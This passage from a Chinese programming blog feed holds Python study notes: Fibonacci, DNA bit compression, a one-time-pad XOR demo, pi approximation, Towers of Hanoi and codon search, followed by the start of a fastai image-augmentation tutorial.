class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    b = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">        tmp = a + b</span><br><span class="line">        a = b</span><br><span class="line">        b = tmp</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">     <span class="built_in">print</span>(fib(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><h4 id="迭代v2"><a href="#迭代v2" class="headerlink" title="迭代v2"></a>迭代v2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    last=<span class="number">0</span></span><br><span class="line">    <span class="built_in">next</span>=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">        last,<span class="built_in">next</span> = <span class="built_in">next</span>,last+<span class="built_in">next</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">     <span class="built_in">print</span>(fib(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><h4 id="用生成器生成前51个数"><a href="#用生成器生成前51个数" class="headerlink" title="用生成器生成前51个数"></a>用生成器生成前51个数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> n&gt;<span class="number">1</span> :</span><br><span class="line">        <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    last=<span class="number">0</span></span><br><span class="line">    <span class="built_in">next</span>=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">        last,<span class="built_in">next</span> = <span class="built_in">next</span>,last+<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="built_in">next</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> fib(<span class="number">50</span>):</span><br><span class="line">         <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><h3 id="简单的压缩算法"><a href="#简单的压缩算法" class="headerlink" title="简单的压缩算法"></a>简单的压缩算法</h3><blockquote><p>如果类的方法或实例变量名用两个下划线开头，Python将会对其进行名称混淆（name mangle），通过加入盐值（salt）来改变其在实现时的名称，使其不易被其他类发现。本书用一条下划线表示“私有”变量或方法，但如果真要强调一些私有内容，或许得用两条下划线才合适。要获取有关Python命名的更多信息，参阅PEP 8中<br>的“描述性命名风格”（Descriptive Naming Styles）部分。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CompressedGene</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, gene: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self._compress(gene)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_compress</span>(<span class="params">self, gene: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.bit_string: <span class="built_in">int</span> = <span class="number">1</span>  <span class="comment">## start with sentinel</span></span><br><span class="line">        <span class="keyword">for</span> nucleotide <span class="keyword">in</span> gene.upper(): <span class="comment">## 返回小写字母转为大写字母的字符串</span></span><br><span class="line">            self.bit_string &lt;&lt;= <span class="number">2</span>  <span class="comment">## shift left two bits</span></span><br><span class="line">            <span class="keyword">if</span> nucleotide == <span class="string">&quot;A&quot;</span>:  <span class="comment">## change last two bits to 00</span></span><br><span class="line">                self.bit_string |= <span class="number">0b00</span></span><br><span class="line">            <span class="keyword">elif</span> nucleotide == <span class="string">&quot;C&quot;</span>:  <span class="comment">## change last two bits to 01</span></span><br><span class="line">                self.bit_string |= <span class="number">0b01</span></span><br><span class="line">            <span class="keyword">elif</span> nucleotide == <span class="string">&quot;G&quot;</span>:  <span class="comment">## change last two bits to 10</span></span><br><span class="line">                self.bit_string |= <span class="number">0b10</span></span><br><span class="line">            <span class="keyword">elif</span> nucleotide == <span class="string">&quot;T&quot;</span>:  <span class="comment">## change last two bits to 11</span></span><br><span class="line">                self.bit_string |= <span class="number">0b11</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid Nucleotide:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(nucleotide))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decompress</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        gene: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, self.bit_string.bit_length() - <span class="number">1</span>, <span class="number">2</span>):  <span class="comment">## - 1 to exclude sentinel</span></span><br><span class="line">            bits: <span class="built_in">int</span> = self.bit_string &gt;&gt; i &amp; <span class="number">0b11</span>  <span class="comment">## get just 2 relevant bits</span></span><br><span class="line">            <span class="keyword">if</span> bits == <span class="number">0b00</span>:  <span class="comment">## A</span></span><br><span class="line">                gene += <span class="string">&quot;A&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> bits == <span class="number">0b01</span>:  <span class="comment">## C</span></span><br><span class="line">                gene += <span class="string">&quot;C&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> bits == <span class="number">0b10</span>:  <span class="comment">## G</span></span><br><span class="line">                gene += <span class="string">&quot;G&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> bits == <span class="number">0b11</span>:  <span class="comment">## T</span></span><br><span class="line">                gene += <span class="string">&quot;T&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid bits:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(bits))</span><br><span class="line">        <span class="keyword">return</span> gene[::-<span class="number">1</span>]  <span class="comment">## [::-1] reverses string by slicing backwards</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span>  <span class="comment">## string representation for pretty printing</span></span><br><span class="line">        <span class="keyword">return</span> self.decompress()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> getsizeof</span><br><span class="line">    original: <span class="built_in">str</span> = <span class="string">&quot;TAGGGATTAACCGTTATATATATATAGCCATGGATCGATTATATAGGGATTAACCGTTATATATATATAGCCATGGATCGATTATA&quot;</span> * <span class="number">100</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;original is &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(getsizeof(original)))</span><br><span class="line">    compressed: CompressedGene = CompressedGene(original)  <span class="comment">## compress</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;compressed is &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(getsizeof(compressed.bit_string)))</span><br><span class="line">    <span class="built_in">print</span>(compressed)  <span class="comment">## decompress</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;original and decompressed are the same: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(original == compressed.decompress()))</span><br></pre></td></tr></table></figure><h3 id="牢不可破的加密方案"><a href="#牢不可破的加密方案" class="headerlink" title="牢不可破的加密方案"></a>牢不可破的加密方案</h3><blockquote><p>str 和 bytes<br>str = ‘你好’ str.encode(‘UTF-8’) –&gt;表示源数据是什么格式的，不指定的话，默认为UTF-8 b’\xe4\xbd\xa0\xe5\xa5\xbd’</p><p>str = b’\xe4\xbd\xa0\xe5\xa5\xbd’ str.decode(‘UTF-8’) –&gt;表示把二进制数据解释成 什么格式的数据（默认UTF-8，待测）</p></blockquote><blockquote><p>XOR(异或)操作<br>Python中的XOR操作符是“A”。在二进制位的上下文中 ，0^1和1^0将返回1，而0^0和1^1则会返回0</p><p>如果用XOR合并两个数的二进制位，那么把结果数与其中某个操作数重新合并即可生成另一个操作数，这是一个很有用的特性<br>A^B=C<br>C^B=A<br>C^A=B</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_bytes</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_key</span>(<span class="params">length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">    <span class="comment">## generate length random bytes</span></span><br><span class="line">    tb: <span class="built_in">bytes</span> = token_bytes(length)</span><br><span class="line">    <span class="comment">## convert those bytes into a bit string and return it</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(tb, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">original: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span></span><br><span class="line">    original_bytes: <span class="built_in">bytes</span> = original.encode()</span><br><span class="line">    dummy: <span class="built_in">int</span> = random_key(<span class="built_in">len</span>(original_bytes))</span><br><span class="line">    original_key: <span class="built_in">int</span> = <span class="built_in">int</span>.from_bytes(original_bytes, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    encrypted: <span class="built_in">int</span> = original_key ^ dummy  <span class="comment">## XOR</span></span><br><span class="line">    <span class="keyword">return</span> dummy, encrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key1: <span class="built_in">int</span>, key2: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    decrypted: <span class="built_in">int</span> = key1 ^ key2  <span class="comment">## XOR</span></span><br><span class="line">    temp: <span class="built_in">bytes</span> = decrypted.to_bytes((decrypted.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> temp.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key1, key2 = encrypt(<span class="string">&quot;One Time Pad!&quot;</span>)</span><br><span class="line">    result: <span class="built_in">str</span> = decrypt(key1, key2)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="计算π"><a href="#计算π" class="headerlink" title="计算π"></a>计算<strong>π</strong></h3><blockquote><p>以下无穷级数的收敛值等于π：<br>π = 4/1 − 4/3 + 4/5 − 4/7 + 4/9 − 4/11…</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span>(<span class="params">n</span>):</span></span><br><span class="line">    num = <span class="number">4.0</span></span><br><span class="line">    dem = <span class="number">1.0</span></span><br><span class="line">    opp = <span class="number">1.0</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="built_in">sum</span> += opp*num/dem</span><br><span class="line">        opp *= -<span class="number">1.0</span></span><br><span class="line">        dem +=<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(cal(<span class="number">60000000</span>))</span><br></pre></td></tr></table></figure><h3 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> TypeVar, <span class="type">Generic</span>, <span class="type">List</span></span><br><span class="line">T = TypeVar(<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span>(<span class="params"><span class="type">Generic</span>[T]</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self._container: <span class="type">List</span>[T] = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span>(<span class="params">self, item: T</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self._container.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">self</span>) -&gt; T:</span></span><br><span class="line">        <span class="keyword">return</span> self._container.pop()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">repr</span>(self._container)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num_discs: <span class="built_in">int</span> = <span class="number">3</span></span><br><span class="line">tower_a: Stack[<span class="built_in">int</span>] = Stack()</span><br><span class="line">tower_b: Stack[<span class="built_in">int</span>] = Stack()</span><br><span class="line">tower_c: Stack[<span class="built_in">int</span>] = Stack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num_discs + <span class="number">1</span>):</span><br><span class="line">    tower_a.push(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanoi</span>(<span class="params">begin: Stack[<span class="built_in">int</span>], end: Stack[<span class="built_in">int</span>], temp: Stack[<span class="built_in">int</span>], n: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        end.push(begin.pop())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hanoi(begin, temp, end, n - <span class="number">1</span>)</span><br><span class="line">        hanoi(begin, end, temp, <span class="number">1</span>)</span><br><span class="line">        hanoi(temp, end, begin, n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    hanoi(tower_a, tower_c, tower_b, num_discs)</span><br><span class="line">    <span class="built_in">print</span>(tower_a)</span><br><span class="line">    <span class="built_in">print</span>(tower_b)</span><br><span class="line">    <span class="built_in">print</span>(tower_c)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">注意</span><br><span class="line">上述stack类实现了_repr_()方法，这样想要查看某个塔 的状况就比较容易了。对stack类调用<span class="built_in">print</span>()时，输出的就是_repr_()的结果。</span><br><span class="line"></span><br><span class="line">注意 </span><br><span class="line">正如本书引言中所述，本书通篇都会使用类型提示。从 typing模块导入<span class="type">Generic</span>，就能让stack在类型提示时泛型化为某种类 型。T= TypeVar(<span class="string">&#x27;T&#x27;</span>)定义了任意类型T。т可以是任何类型。后续在求解汉诺塔问题时使用的Stack，就用到了类型提示，类型提示为 Stack[<span class="built_in">int</span>]类型，表示T应该填入<span class="built_in">int</span>类型的数据。换句话说，该栈是一个整数栈。如果对类型提示还存在困惑，不妨阅读一下附录C。</span><br><span class="line"></span><br><span class="line">递归的情况可以被拆分为以下<span class="number">3</span>步。 </span><br><span class="line">(<span class="number">1</span>)将上层n-<span class="number">1</span>个圆盘从塔A移到塔B(暂存塔)，用塔C作为中 转塔。 </span><br><span class="line">(<span class="number">2</span>)将底层的圆盘从塔A移到塔C。 </span><br><span class="line">(<span class="number">3</span>)将n-<span class="number">1</span>个圆盘从塔B移到塔C，用塔A作为中转塔。</span><br></pre></td></tr></table></figure><h2 id="第2章"><a href="#第2章" class="headerlink" title="第2章"></a>第2章</h2><h3 id="DNA搜索"><a href="#DNA搜索" class="headerlink" title="DNA搜索"></a>DNA搜索</h3><h4 id="线性搜索"><a href="#线性搜索" class="headerlink" title="线性搜索"></a>线性搜索</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> IntEnum</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line">Nucleotide: IntEnum = IntEnum(<span class="string">&#x27;Nucleotide&#x27;</span>, (<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">Codon = <span class="type">Tuple</span>[Nucleotide, Nucleotide, Nucleotide]  <span class="comment">## type alias for codons</span></span><br><span class="line">Gene = <span class="type">List</span>[Codon]  <span class="comment">## type alias for genes</span></span><br><span class="line"></span><br><span class="line">gene_str: <span class="built_in">str</span> = <span class="string">&quot;ACGTGGCTCTCTAACGTACGTACGTACGGGGTTTATATATACCCTAGGACTCCCTTT&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string_to_gene</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; Gene:</span></span><br><span class="line">    gene: Gene = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">3</span>):</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">2</span>) &gt;= <span class="built_in">len</span>(s):  <span class="comment">## don&#x27;t run off end!</span></span><br><span class="line">            <span class="keyword">return</span> gene</span><br><span class="line">        <span class="comment">##  initialize codon out of three nucleotides</span></span><br><span class="line">        codon: Codon = (Nucleotide[s[i]], Nucleotide[s[i + <span class="number">1</span>]], Nucleotide[s[i + <span class="number">2</span>]])</span><br><span class="line">        gene.append(codon)  <span class="comment">## add codon to gene</span></span><br><span class="line">    <span class="keyword">return</span> gene</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_gene: Gene = string_to_gene(gene_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_contains</span>(<span class="params">gene: Gene, key_codon: Codon</span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">    <span class="keyword">for</span> codon <span class="keyword">in</span> gene:</span><br><span class="line">        <span class="keyword">if</span> codon == key_codon:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">acg: Codon = (Nucleotide.A, Nucleotide.C, Nucleotide.G)</span><br><span class="line">gat: Codon = (Nucleotide.G, Nucleotide.A, Nucleotide.T)</span><br><span class="line"><span class="built_in">print</span>(linear_contains(my_gene, acg))  <span class="comment">## True</span></span><br><span class="line"><span class="built_in">print</span>(linear_contains(my_gene, gat))  <span class="comment">## False</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意 上述函数仅供演示。Python内置的序列类型（<span class="built_in">list</span>、 <span class="built_in">tuple</span>、 <span class="built_in">range</span>)都已实现了＿contains__()方法，这样就能简单地用<span class="keyword">in</span> 操作符在其中搜索某个指定的数据项。实际上，<span class="keyword">in</span>运算符可以与任何 已实现__contains__()方法的类型一起使用。例如，执行<span class="built_in">print</span>(acg <span class="keyword">in</span> my_gene)语句即可在my_gene中搜索acg并打印出结果。此示例也演示了枚举类型的用法。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastai教程</title>
      <link href="/2021/07/28/fastai%E6%95%99%E7%A8%8B/"/>
      <url>/2021/07/28/fastai%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="快速预览应用"><a href="#快速预览应用" class="headerlink" title="快速预览应用"></a>快速预览应用</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#默认是抓取图像中心进行裁剪</span></span><br><span class="line">item tfms=Resize(<span class="number">128</span>)</span><br><span class="line"><span class="comment">#改为将图像进行拉伸</span></span><br><span class="line">Resize(<span class="number">128</span>, ResizeMethod.Squish)</span><br><span class="line"><span class="comment">#改为将不足的区域进行填充（这里zero可以改成reflect）</span></span><br><span class="line">bears  bears.new(item_tfms=Resize(<span class="number">128</span>, ResizeMethod.Pad, pad_mode=<span class="string">&#x27;zeros&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对Datablock进行处理：用原来的block创建新的block</span></span><br><span class="line">bears = bears. new(item_tfms=Resize(<span class="number">128</span>, ResizeMethod. Squish)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">或者是用RandomResizedCrop</span><br><span class="line">bears = bears.new(item _tfms=RandomRes izedCrop(<span class="number">128</span>, min_scale=<span class="number">0.3</span>))</span><br><span class="line">这样在每一轮训练中网络看到的图片都是不同的</span><br><span class="line">min_scale=<span class="number">0.3</span>：每次至少裁剪<span class="number">30</span>%</span><br><span class="line">以上也是最常用的数据扩增方法</span><br></pre></td></tr></table></figure><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/0.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上图中，首先CPU执行item_tfms,把图像统一大小，再用GPU执行batch_tfms做数据扩增，这样执行速度快</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意：fastai中数据增强只对训练集有效，除了randomresizedcrop之外，他对训练集会抓取随机位置的局部来裁剪，对验证集他会抓取他能抓取的正方形中心位置</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在建立了一个模型之后再进行数据清洗会方便，因为可以用下图这个函数挑选</span><br></pre></td></tr></table></figure><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/1.png"></p><h2 id="准备数据"><a href="#准备数据" class="headerlink" title="准备数据"></a>准备数据</h2><h3 id="使用Bing-image-search-api"><a href="#使用Bing-image-search-api" class="headerlink" title="使用Bing image search api"></a>使用Bing image search api</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/2.png"></p><h3 id="分类下载图片到各个文件夹"><a href="#分类下载图片到各个文件夹" class="headerlink" title="分类下载图片到各个文件夹"></a>分类下载图片到各个文件夹</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/3.png"></p><h3 id="删除下载失败的图片"><a href="#删除下载失败的图片" class="headerlink" title="删除下载失败的图片"></a>删除下载失败的图片</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/4.png"></p><h3 id="创建一个Dataloader模板-DataBlock"><a href="#创建一个Dataloader模板-DataBlock" class="headerlink" title="创建一个Dataloader模板-DataBlock"></a>创建一个Dataloader模板-DataBlock</h3><p><img 